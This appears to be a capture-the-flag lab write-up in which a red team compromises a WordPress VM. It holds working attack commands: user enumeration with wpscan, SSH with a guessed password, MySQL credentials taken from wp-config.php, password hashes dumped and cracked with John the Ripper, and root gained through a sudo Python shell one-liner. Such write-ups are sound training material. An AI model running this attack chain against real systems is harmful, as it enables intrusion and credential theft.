# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services

Nmap scan results for each machine reveal the below services and OS details:

```bash
$ nmap -sV 192.168.1.0/24
```
![Nmap scan results](/Images/Nmap-scan1.jpg)
![](/Images/Nmap-scan2.jpg)

This scan identifies the services below as potential points of entry:

**Target 1 (192.168.1.110)**

  - Port 22/TCP 	    Open 	SSH
  - Port 80/TCP 	    Open 	HTTP
  - Port 111/TCP 	Open 	rcpbind
  - Port 139/TCP 	Open 	netbios-ssn
  - Port 445/TCP 	Open 	netbios-ssn


The following vulnerabilities were identified on each target:

**Target 1**

  - User Enumeration (WordPress site) - easily found with `wpscan`
  - Weak User Password - user Michael using "Michael" as their password 
  - MySQL Password Unencrypted in Config File (wp-config.php)
  - Misconfiguration of User Privileges/Privilege Escalation - Python command can be easily used to gain root access. 


- User Enumeration

![User Enumeration WPscan](/Images/wpscan.jpg)

- Weak User Password

![SSH into wp](/Images/ssh-michael.jpg)

- MySQL Password Plaintext

![Password Hash](/Images/wp-config.jpg)

- Misconfiguration of User Privileges

![User Privileges](/Images/python-command.jpg)


### Exploitation

The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
- Target 1

  - `Flag 1: b9bbcb33ellb80be759c4e844862482d`
    - **Exploit Used**
      - WPScan to enumerate users of the Target 1 WordPress site
    - Command: 
        - `$ wpscan --url http://192.168.1.110 --enumerate u`

![User Enumeration Users](/Images/wp-enumeration.jpg)

- Targeting user Michael
    - Guessed Michael's password easily as it is their name
    - User password: michael
    
- Capturing Flag 1: SSH in as Michael navigating through directories starting from the root directory.
    - Flag 1 found in var/www/html directory in the `service.html` file using `grep`.
    - Commands:
        - `ssh michael@192.168.1.110 -p22`
        - `pw: michael`
        - `cd /`
        - `cd var/www/html`
        - `ls -la`
        - `grep flag *`

![Flag 1](/Images/flag1.jpg)



  - `Flag 2: fc3fd58dcdad9ab23faca6e9a3e581c`
    - **Exploit Used**
      - Same exploit used to gain Flag 1.
      - Capturing Flag 2: While SSH in as user Michael, Flag 2 was also found.
        - Navigating through directories and files as before, Flag 2 was found in /var/www next to the html folder that held Flag 1.
        - Commands:
            - `ssh michael@192.168.1.110` 
            - `pw: michael`
            - `cd /` 
            - `find / -name flag*
            - `cd var/www/`
            - `ls -la`
            - `cat flag2.txt`

![Flag 2 find](/Images/flag2-find.jpg)

![Flag 2 cat](/Images/flag2.jpg)



- `Flag 3: afc01ab56b50591e7dccf93122770cd2`
    - **Exploit Used**
      - Same exploits used to gain Flag 1 and 2.
      - Capturing Flag 3: Accessing MySQL database.
        - Once having found wp-config.php and gaining access to the database credentials as Michael, MySQL was used to explore the database.
        - Flag 3 was found in wp_posts table in the wordpress database. Intrestingly enough Flag 4 was also found alongside Flag 3 in the wp_posts table.
        - Commands:
            - `mysql --user=root --password=R@v3nSecurity` 
            - `show databases;`
            - `use wordpress;` 
            - `show tables;`
            - `SELECT * FROM wp_posts;`

![Flag 3](/Images/flag3.jpg)



- `Flag 4: 715dea6c055b9fe3337544932f2941ce`
    - **Exploit Used**
      - Unsalted password hash and the use of privilege escalation with Python.
      - Capturing Flag 4: Retrieve user credentials from database, crack password hash with John the Ripper and use Python to gain root privileges.
        - Once having gained access to the database credentials as Michael from the wp-config.php file, lifting username and password hashes using MySQL was next. 
        - These user credentials are stored in the wp_users table of the wordpress database. The usernames and password hashes were copied/saved to the Kali machine in a file called wp_hashes.txt.
            - Commands:
                - `mysql --user=root --password=R@v3nSecurity` 
                - `show databases;`
                - `use wordpress;` 
                - `show tables;`
                - `SELECT * FROM wp_users;`

        - ![wp_users table](/Images/wpusers-table.jpg)

        - On the Kali local machine the wp_hashes.txt was run against John the Ripper to crack the hashes. 
            - Command:
                - `john wp_hashes.txt`

        - ![John the Ripper](/Images/john.jpg)

        - Once Steven’s password hash was cracked, the next thing to do was SSH as Steven. Then as Steven checking for privilege and escalating to root with Python
            - Commands: 
                - `ssh steven@192.168.1.110 -p22`
                - `pw:pink84`
                - `sudo -l`
                - `sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’`
                - `cd /root`
                - `ls -la`
                - `cat flag4.txt`

![steven ssh](/Images/steven-ssh.jpg)

![evelating privileges](/Images/python-command.jpg)

![Flag 4](/Images/flag4.jpg)



